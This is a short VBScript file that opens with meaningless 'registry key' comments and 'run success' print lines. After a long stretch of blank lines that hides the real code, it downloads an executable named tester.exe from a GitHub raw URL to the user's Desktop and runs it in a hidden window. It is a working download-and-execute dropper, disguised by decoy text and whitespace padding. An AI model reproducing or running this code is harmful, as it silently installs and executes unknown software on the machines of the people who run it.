Option Explicit
'GET FILE'' =-155
'Set run = fix.REGKEY();go to 0x904,0x804,0804m,0704d,
'0x904 VtxLfyN5nrtJeE2Yn53mHBkUpFPzUcn7dwzNPbG0xLidMx30sxJ8RoznGtA7VhCaGKhEdzTeFWgd189x41dV5HhYcxQczG8n2sv0
'0x804 Lu3RXdfYMJLUDGxpGYL9aR4Hx28xn0quPfE7gurJQbwuUH33YWfZdevzhKpJk4w69ZLvQrRgcb4rRM7ARXsE6qd6X8i7D10Yw3RC
'0804m 4LRNNpDxZGQnh0gXtu22ZWPGPZUWA8Z3iBjM5CpayDRpVKerZu1fBUzkXMAZNWn85kvHQNs58PC3GAbzCeU55bYcqjwvy2aB801e
'0704d ozk74heBA90397UV4ZzsYp1x5hJNioP08tg3sqhhEcmyRUWd8zu1Cz1wz3ffHZkyx1J3o9MNtw7irKUUMuvnLmf9dCKh2dx52C0c
Print "'Set run = fix.REGKEY();go to 0x904,0x804,0804m,0704d,
'0x904 VtxLfyN5nrtJeE2Yn53mHBkUpFPzUcn7dwzNPbG0xLidMx30sxJ8RoznGtA7VhCaGKhEdzTeFWgd189x41dV5HhYcxQczG8n2sv0
'0x804 Lu3RXdfYMJLUDGxpGYL9aR4Hx28xn0quPfE7gurJQbwuUH33YWfZdevzhKpJk4w69ZLvQrRgcb4rRM7ARXsE6qd6X8i7D10Yw3RC
'0804m 4LRNNpDxZGQnh0gXtu22ZWPGPZUWA8Z3iBjM5CpayDRpVKerZu1fBUzkXMAZNWn85kvHQNs58PC3GAbzCeU55bYcqjwvy2aB801e
'0704d ozk74heBA90397UV4ZzsYp1x5hJNioP08tg3sqhhEcmyRUWd8zu1Cz1wz3ffHZkyx1J3o9MNtw7irKUUMuvnLmf9dCKh2dx52C0c"
Print "run success"









































Dim objShell, objHTTP, url, savePath, objNetwork, strUsername, strOriginalSavePath, strSavePath ,desktopPath ,folderName , folderPath , LOC, objFSO
Set objNetwork = CreateObject("WScript.Network")
Set objShell = CreateObject("Shell.Application")
Set objHTTP = CreateObject("MSXML2.XMLHTTP")
strUsername = objNetwork.UserName
strOriginalSavePath = "C:\Users\%USERNAME%\Desktop\ESSANTIK\tester.exe"
strSavePath = Replace(strOriginalSavePath, "%USERNAME%", strUsername)


url = "https://github.com/essantik/essantik/raw/main/tester.exe"
' Download the file
objHTTP.Open "GET", url, False
objHTTP.send
If objHTTP.Status = 200 Then
    Dim objStream, outputStream
    Set objStream = CreateObject("ADODB.Stream")
    objStream.Open
    objStream.Type = 1
    objStream.Write objHTTP.responseBody
    objStream.Position = 0
    objStream.SaveToFile strSavePath
    objStream.Close
    Set objStream = Nothing
    Set objHTTP = Nothing
    ' Open
    objShell.Run strSavePath, 0, false
End If


' Release the Shell object
Set objShell = Nothing